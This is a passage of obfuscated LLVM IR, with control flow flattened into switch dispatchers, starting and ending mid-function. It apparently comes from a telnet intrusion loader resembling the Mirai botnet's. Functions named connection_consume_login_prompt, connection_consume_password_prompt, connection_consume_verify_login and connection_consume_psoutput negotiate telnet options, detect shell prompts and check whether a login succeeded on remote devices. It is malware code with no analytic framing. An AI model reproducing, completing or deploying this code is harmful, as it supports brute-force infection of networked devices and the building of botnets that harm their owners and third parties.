  %111 = select i1 %110, i32 -2028991740, i32 -1623530881
  store i32 %111, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = load i8*, i8** %4, align 8
  %114 = load i32, i32* %5, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds i8, i8* %113, i64 %115
  store i8 -4, i8* %116, align 1
  store i32 373842580, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i8*, i8** %4, align 8
  %119 = load i32, i32* %5, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8, i8* %118, i64 %120
  %122 = load i8, i8* %121, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp eq i32 %123, 251
  %125 = select i1 %124, i32 1260904576, i32 144608073
  store i32 %125, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = load i8*, i8** %4, align 8
  %128 = load i32, i32* %5, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8, i8* %127, i64 %129
  store i8 -3, i8* %130, align 1
  store i32 144608073, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  store i32 373842580, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  store i32 1623693867, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i32, i32* %5, align 4
  %135 = add nsw i32 %134, 1
  store i32 %135, i32* %5, align 4
  store i32 346270788, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = load %struct.connection*, %struct.connection** %2, align 8
  %138 = getelementptr inbounds %struct.connection, %struct.connection* %137, i32 0, i32 4
  %139 = load i32, i32* %138, align 8
  %140 = load i8*, i8** %4, align 8
  %141 = call i64 @send(i32 %139, i8* %140, i64 3, i32 16384)
  %142 = load i8*, i8** %4, align 8
  %143 = getelementptr inbounds i8, i8* %142, i64 3
  store i8* %143, i8** %4, align 8
  %144 = load i32, i32* %3, align 4
  %145 = add nsw i32 %144, 3
  store i32 %145, i32* %3, align 4
  store i32 -1368386453, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  store i32 1630311256, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  store i32 -1208409238, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  store i32 -840650730, i32* %switchVar
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  store i32 1705361883, i32* %switchVar
  br label %loopEnd

; <label>:150:                                    ; preds = %loopEntry
  %151 = load i32, i32* %3, align 4
  ret i32 %151

loopEnd:                                          ; preds = %149, %148, %147, %146, %136, %133, %132, %131, %126, %117, %112, %103, %99, %98, %97, %91, %90, %75, %74, %67, %66, %58, %51, %46, %39, %38, %32, %26, %25, %19, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal signext i8 @can_consume(%struct.connection*, i8*, i32) #0 {
  %4 = alloca %struct.connection*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store %struct.connection* %0, %struct.connection** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load %struct.connection*, %struct.connection** %4, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 15
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i32 0, i32 0
  %11 = load %struct.connection*, %struct.connection** %4, align 8
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %11, i32 0, i32 9
  %13 = load i16, i16* %12, align 8
  %14 = zext i16 %13 to i32
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %10, i64 %15
  store i8* %16, i8** %7, align 8
  %17 = load i8*, i8** %5, align 8
  %18 = load i32, i32* %6, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = load i8*, i8** %7, align 8
  %22 = icmp ult i8* %20, %21
  %23 = zext i1 %22 to i32
  %24 = trunc i32 %23 to i8
  ret i8 %24
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #2

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_login_prompt(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  store i32 %11, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -417992327, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -417992327, label %12
    i32 389484663, label %16
    i32 -39310468, label %26
    i32 1306370030, label %36
    i32 -985226619, label %46
    i32 -284379872, label %56
    i32 210447395, label %66
    i32 1113015955, label %68
    i32 1771153896, label %69
    i32 -1738716870, label %72
    i32 673829487, label %76
    i32 233824984, label %87
    i32 -928760619, label %89
    i32 -148999773, label %100
    i32 -1918404309, label %102
    i32 1941877552, label %103
    i32 730983502, label %104
    i32 1745819611, label %108
    i32 -438580977, label %109
    i32 1718728415, label %111
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i32, i32* %5, align 4
  %14 = icmp sge i32 %13, 0
  %15 = select i1 %14, i32 389484663, i32 -1738716870
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load %struct.connection*, %struct.connection** %3, align 8
  %18 = getelementptr inbounds %struct.connection, %struct.connection* %17, i32 0, i32 15
  %19 = load i32, i32* %5, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds [8192 x i8], [8192 x i8]* %18, i64 0, i64 %20
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp eq i32 %23, 58
  %25 = select i1 %24, i32 210447395, i32 -39310468
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load %struct.connection*, %struct.connection** %3, align 8
  %28 = getelementptr inbounds %struct.connection, %struct.connection* %27, i32 0, i32 15
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [8192 x i8], [8192 x i8]* %28, i64 0, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 62
  %35 = select i1 %34, i32 210447395, i32 1306370030
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load %struct.connection*, %struct.connection** %3, align 8
  %38 = getelementptr inbounds %struct.connection, %struct.connection* %37, i32 0, i32 15
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds [8192 x i8], [8192 x i8]* %38, i64 0, i64 %40
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 36
  %45 = select i1 %44, i32 210447395, i32 -985226619
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load %struct.connection*, %struct.connection** %3, align 8
  %48 = getelementptr inbounds %struct.connection, %struct.connection* %47, i32 0, i32 15
  %49 = load i32, i32* %5, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds [8192 x i8], [8192 x i8]* %48, i64 0, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 35
  %55 = select i1 %54, i32 210447395, i32 -284379872
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load %struct.connection*, %struct.connection** %3, align 8
  %58 = getelementptr inbounds %struct.connection, %struct.connection* %57, i32 0, i32 15
  %59 = load i32, i32* %5, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds [8192 x i8], [8192 x i8]* %58, i64 0, i64 %60
  %62 = load i8, i8* %61, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp eq i32 %63, 37
  %65 = select i1 %64, i32 210447395, i32 1113015955
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %5, align 4
  store i32 %67, i32* %6, align 4
  store i32 -1738716870, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 1771153896, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %5, align 4
  %71 = add nsw i32 %70, -1
  store i32 %71, i32* %5, align 4
  store i32 -417992327, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i32, i32* %6, align 4
  %74 = icmp eq i32 %73, -1
  %75 = select i1 %74, i32 673829487, i32 730983502
  store i32 %75, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = load %struct.connection*, %struct.connection** %3, align 8
  %78 = getelementptr inbounds %struct.connection, %struct.connection* %77, i32 0, i32 15
  %79 = getelementptr inbounds [8192 x i8], [8192 x i8]* %78, i32 0, i32 0
  %80 = load %struct.connection*, %struct.connection** %3, align 8
  %81 = getelementptr inbounds %struct.connection, %struct.connection* %80, i32 0, i32 9
  %82 = load i16, i16* %81, align 8
  %83 = zext i16 %82 to i32
  %84 = call i32 @util_memsearch(i8* %79, i32 %83, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i32 0, i32 0), i32 4)
  store i32 %84, i32* %7, align 4
  %85 = icmp ne i32 %84, -1
  %86 = select i1 %85, i32 233824984, i32 -928760619
  store i32 %86, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i32, i32* %7, align 4
  store i32 %88, i32* %6, align 4
  store i32 1941877552, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = load %struct.connection*, %struct.connection** %3, align 8
  %91 = getelementptr inbounds %struct.connection, %struct.connection* %90, i32 0, i32 15
  %92 = getelementptr inbounds [8192 x i8], [8192 x i8]* %91, i32 0, i32 0
  %93 = load %struct.connection*, %struct.connection** %3, align 8
  %94 = getelementptr inbounds %struct.connection, %struct.connection* %93, i32 0, i32 9
  %95 = load i16, i16* %94, align 8
  %96 = zext i16 %95 to i32
  %97 = call i32 @util_memsearch(i8* %92, i32 %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0), i32 5)
  store i32 %97, i32* %7, align 4
  %98 = icmp ne i32 %97, -1
  %99 = select i1 %98, i32 -148999773, i32 -1918404309
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = load i32, i32* %7, align 4
  store i32 %101, i32* %6, align 4
  store i32 -1918404309, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  store i32 1941877552, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  store i32 730983502, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i32, i32* %6, align 4
  %106 = icmp eq i32 %105, -1
  %107 = select i1 %106, i32 1745819611, i32 -438580977
  store i32 %107, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 1718728415, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i32, i32* %6, align 4
  store i32 %110, i32* %2, align 4
  store i32 1718728415, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %2, align 4
  ret i32 %112

loopEnd:                                          ; preds = %109, %108, %104, %103, %102, %100, %89, %87, %76, %72, %69, %68, %66, %56, %46, %36, %26, %16, %12, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_password_prompt(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  store i32 %11, i32* %5, align 4
  %switchVar = alloca i32
  store i32 821131437, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 821131437, label %12
    i32 -1083867695, label %16
    i32 -1035561459, label %26
    i32 -1225236665, label %36
    i32 -450649419, label %46
    i32 82057954, label %56
    i32 -1305188009, label %66
    i32 899661410, label %68
    i32 1580636928, label %69
    i32 395583223, label %72
    i32 -2047440449, label %76
    i32 2002623503, label %87
    i32 1147992511, label %89
    i32 -376765846, label %90
    i32 269092900, label %94
    i32 -1748321593, label %95
    i32 -675130081, label %97
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i32, i32* %5, align 4
  %14 = icmp sge i32 %13, 0
  %15 = select i1 %14, i32 -1083867695, i32 395583223
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load %struct.connection*, %struct.connection** %3, align 8
  %18 = getelementptr inbounds %struct.connection, %struct.connection* %17, i32 0, i32 15
  %19 = load i32, i32* %5, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds [8192 x i8], [8192 x i8]* %18, i64 0, i64 %20
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp eq i32 %23, 58
  %25 = select i1 %24, i32 -1305188009, i32 -1035561459
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load %struct.connection*, %struct.connection** %3, align 8
  %28 = getelementptr inbounds %struct.connection, %struct.connection* %27, i32 0, i32 15
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [8192 x i8], [8192 x i8]* %28, i64 0, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 62
  %35 = select i1 %34, i32 -1305188009, i32 -1225236665
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load %struct.connection*, %struct.connection** %3, align 8
  %38 = getelementptr inbounds %struct.connection, %struct.connection* %37, i32 0, i32 15
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds [8192 x i8], [8192 x i8]* %38, i64 0, i64 %40
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 36
  %45 = select i1 %44, i32 -1305188009, i32 -450649419
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load %struct.connection*, %struct.connection** %3, align 8
  %48 = getelementptr inbounds %struct.connection, %struct.connection* %47, i32 0, i32 15
  %49 = load i32, i32* %5, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds [8192 x i8], [8192 x i8]* %48, i64 0, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 35
  %55 = select i1 %54, i32 -1305188009, i32 82057954
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load %struct.connection*, %struct.connection** %3, align 8
  %58 = getelementptr inbounds %struct.connection, %struct.connection* %57, i32 0, i32 15
  %59 = load i32, i32* %5, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds [8192 x i8], [8192 x i8]* %58, i64 0, i64 %60
  %62 = load i8, i8* %61, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp eq i32 %63, 37
  %65 = select i1 %64, i32 -1305188009, i32 899661410
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %5, align 4
  store i32 %67, i32* %6, align 4
  store i32 395583223, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 1580636928, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %5, align 4
  %71 = add nsw i32 %70, -1
  store i32 %71, i32* %5, align 4
  store i32 821131437, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i32, i32* %6, align 4
  %74 = icmp eq i32 %73, -1
  %75 = select i1 %74, i32 -2047440449, i32 -376765846
  store i32 %75, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = load %struct.connection*, %struct.connection** %3, align 8
  %78 = getelementptr inbounds %struct.connection, %struct.connection* %77, i32 0, i32 15
  %79 = getelementptr inbounds [8192 x i8], [8192 x i8]* %78, i32 0, i32 0
  %80 = load %struct.connection*, %struct.connection** %3, align 8
  %81 = getelementptr inbounds %struct.connection, %struct.connection* %80, i32 0, i32 9
  %82 = load i16, i16* %81, align 8
  %83 = zext i16 %82 to i32
  %84 = call i32 @util_memsearch(i8* %79, i32 %83, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i32 7)
  store i32 %84, i32* %7, align 4
  %85 = icmp ne i32 %84, -1
  %86 = select i1 %85, i32 2002623503, i32 1147992511
  store i32 %86, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i32, i32* %7, align 4
  store i32 %88, i32* %6, align 4
  store i32 1147992511, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 -376765846, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* %6, align 4
  %92 = icmp eq i32 %91, -1
  %93 = select i1 %92, i32 269092900, i32 -1748321593
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -675130081, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = load i32, i32* %6, align 4
  store i32 %96, i32* %2, align 4
  store i32 -675130081, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  %98 = load i32, i32* %2, align 4
  ret i32 %98

loopEnd:                                          ; preds = %95, %94, %90, %89, %87, %76, %72, %69, %68, %66, %56, %46, %36, %26, %16, %12, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_prompt(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %7 = load %struct.connection*, %struct.connection** %3, align 8
  %8 = getelementptr inbounds %struct.connection, %struct.connection* %7, i32 0, i32 9
  %9 = load i16, i16* %8, align 8
  %10 = zext i16 %9 to i32
  store i32 %10, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -1938790110, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1938790110, label %11
    i32 83333813, label %15
    i32 -1780839671, label %25
    i32 -304112607, label %35
    i32 681226300, label %45
    i32 -1060461888, label %55
    i32 1088680121, label %65
    i32 1609264796, label %67
    i32 -1655139613, label %68
    i32 -574034191, label %71
    i32 1814858260, label %75
    i32 -1914276260, label %76
    i32 1449961178, label %78
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %5, align 4
  %13 = icmp sge i32 %12, 0
  %14 = select i1 %13, i32 83333813, i32 -574034191
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load %struct.connection*, %struct.connection** %3, align 8
  %17 = getelementptr inbounds %struct.connection, %struct.connection* %16, i32 0, i32 15
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [8192 x i8], [8192 x i8]* %17, i64 0, i64 %19
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp eq i32 %22, 58
  %24 = select i1 %23, i32 1088680121, i32 -1780839671
  store i32 %24, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load %struct.connection*, %struct.connection** %3, align 8
  %27 = getelementptr inbounds %struct.connection, %struct.connection* %26, i32 0, i32 15
  %28 = load i32, i32* %5, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [8192 x i8], [8192 x i8]* %27, i64 0, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = zext i8 %31 to i32
  %33 = icmp eq i32 %32, 62
  %34 = select i1 %33, i32 1088680121, i32 -304112607
  store i32 %34, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load %struct.connection*, %struct.connection** %3, align 8
  %37 = getelementptr inbounds %struct.connection, %struct.connection* %36, i32 0, i32 15
  %38 = load i32, i32* %5, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [8192 x i8], [8192 x i8]* %37, i64 0, i64 %39
  %41 = load i8, i8* %40, align 1
  %42 = zext i8 %41 to i32
  %43 = icmp eq i32 %42, 36
  %44 = select i1 %43, i32 1088680121, i32 681226300
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load %struct.connection*, %struct.connection** %3, align 8
  %47 = getelementptr inbounds %struct.connection, %struct.connection* %46, i32 0, i32 15
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds [8192 x i8], [8192 x i8]* %47, i64 0, i64 %49
  %51 = load i8, i8* %50, align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %52, 35
  %54 = select i1 %53, i32 1088680121, i32 -1060461888
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load %struct.connection*, %struct.connection** %3, align 8
  %57 = getelementptr inbounds %struct.connection, %struct.connection* %56, i32 0, i32 15
  %58 = load i32, i32* %5, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds [8192 x i8], [8192 x i8]* %57, i64 0, i64 %59
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp eq i32 %62, 37
  %64 = select i1 %63, i32 1088680121, i32 1609264796
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %5, align 4
  store i32 %66, i32* %6, align 4
  store i32 -574034191, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  store i32 -1655139613, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i32, i32* %5, align 4
  %70 = add nsw i32 %69, -1
  store i32 %70, i32* %5, align 4
  store i32 -1938790110, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %6, align 4
  %73 = icmp eq i32 %72, -1
  %74 = select i1 %73, i32 1814858260, i32 -1914276260
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 1449961178, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = load i32, i32* %6, align 4
  store i32 %77, i32* %2, align 4
  store i32 1449961178, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i32, i32* %2, align 4
  ret i32 %79

loopEnd:                                          ; preds = %76, %75, %71, %68, %67, %65, %55, %45, %35, %25, %15, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_verify_login(%struct.connection*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1030349444, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1030349444, label %first
    i32 1687943720, label %16
    i32 -552088879, label %17
    i32 -268602610, label %19
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp eq i32 %.reload, -1
  %15 = select i1 %14, i32 1687943720, i32 -552088879
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -268602610, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load i32, i32* %4, align 4
  store i32 %18, i32* %2, align 4
  store i32 -268602610, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %2, align 4
  ret i32 %20

loopEnd:                                          ; preds = %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_psoutput(%struct.connection*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %16 = load %struct.connection*, %struct.connection** %3, align 8
  %17 = getelementptr inbounds %struct.connection, %struct.connection* %16, i32 0, i32 15
  %18 = getelementptr inbounds [8192 x i8], [8192 x i8]* %17, i32 0, i32 0
  store i8* %18, i8** %5, align 8
  %19 = load %struct.connection*, %struct.connection** %3, align 8
  %20 = getelementptr inbounds %struct.connection, %struct.connection* %19, i32 0, i32 15
  %21 = getelementptr inbounds [8192 x i8], [8192 x i8]* %20, i32 0, i32 0
  %22 = load %struct.connection*, %struct.connection** %3, align 8
  %23 = getelementptr inbounds %struct.connection, %struct.connection* %22, i32 0, i32 9
  %24 = load i16, i16* %23, align 8
  %25 = zext i16 %24 to i32
  %26 = call i32 @util_memsearch(i8* %21, i32 %25, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %26, i32* %4, align 4
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 651136845, i32* %switchVar
  %.reg2mem2 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 651136845, label %27
    i32 894317963, label %32
    i32 -1829153028, label %37
    i32 -122622077, label %39
    i32 -1163176617, label %42
    i32 585563597, label %52
    i32 -1130506671, label %58
    i32 -1292490192, label %68
    i32 52214070, label %74
    i32 -325403009, label %88
    i32 -140549506, label %97
    i32 1656018996, label %106
    i32 -76262579, label %115
    i32 1079918896, label %120
    i32 154235129, label %124
    i32 1059534070, label %127
    i32 419632203, label %132
    i32 809163729, label %137
    i32 197802920, label %144
    i32 -1649366180, label %149
    i32 59348108, label %154
    i32 -15897161, label %159
    i32 -658596592, label %164
    i32 182234961, label %165
    i32 1829967931, label %166
    i32 1907402504, label %167
    i32 1938244572, label %170
    i32 1301305021, label %174
    i32 1003150835, label %178
    i32 759198897, label %187
    i32 992026315, label %192
    i32 329385465, label %197
    i32 1229258368, label %203
